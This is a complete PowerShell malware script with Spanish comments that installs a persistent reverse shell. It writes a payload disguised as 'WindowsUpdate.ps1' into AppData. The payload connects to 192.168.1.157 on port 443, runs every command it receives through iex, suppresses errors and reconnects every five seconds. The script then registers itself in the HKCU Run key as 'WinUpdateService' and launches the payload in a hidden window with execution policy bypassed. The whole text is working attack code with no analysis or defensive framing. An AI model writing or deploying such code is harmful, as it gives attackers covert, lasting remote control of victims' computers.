$ip = '192.168.1.157'
$port = 443
$path = "$env:APPDATA\WindowsUpdate.ps1"

$code = @"
`$ip = '$ip'
`$port = $port

while (`$true) {
    `$client = `$null
    `$stream = `$null
    
    try {
        # 1. Crear nueva conexión
        `$client = New-Object System.Net.Sockets.TcpClient
        `$client.Connect(`$ip, `$port)
        `$stream = `$client.GetStream()
        
        # 2. Configurar streams
        `$writer = New-Object IO.StreamWriter(`$stream)
        `$reader = New-Object IO.StreamReader(`$stream)
        `$writer.AutoFlush = `$true
        
        # 3. Enviar prompt inicial
        `$cwd = (Get-Location).Path
        `$writer.Write("PS `$cwd> ")

        # 4. Bucle principal de comandos
        while (`$true) {
            if (`$client.Client.Poll(0, [System.Net.Sockets.SelectMode]::SelectRead) -and (`$client.Available -eq 0)) {
                break
            }
            
            if (`$stream.DataAvailable) {
                `$command = `$reader.ReadLine()
                if (-not [string]::IsNullOrEmpty(`$command)) {
                    `$output = try { iex `$command 2>&1 | Out-String } catch { "ERROR: `$(`$_.Exception.Message)" }
                    `$cwd = (Get-Location).Path
                    `$writer.Write("`$output`nPS `$cwd> ")
                }
            }

            Start-Sleep -Milliseconds 100
        }
    }
    catch {
        # Silenciar errores de conexión
    }
    finally {
        try { `$writer.Dispose() } catch {}
        try { `$reader.Dispose() } catch {}
        try { `$stream.Dispose() } catch {}
        try { `$client.Close() } catch {}
    }
    
    # 6. Reconexión agresiva
    Start-Sleep -Seconds 5
}
"@

# Instalar persistencia
Set-Content -Path $path -Value $code -Force
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WinUpdateService /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Exec Bypass -File `"$path`"" /f
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$path`""
exit
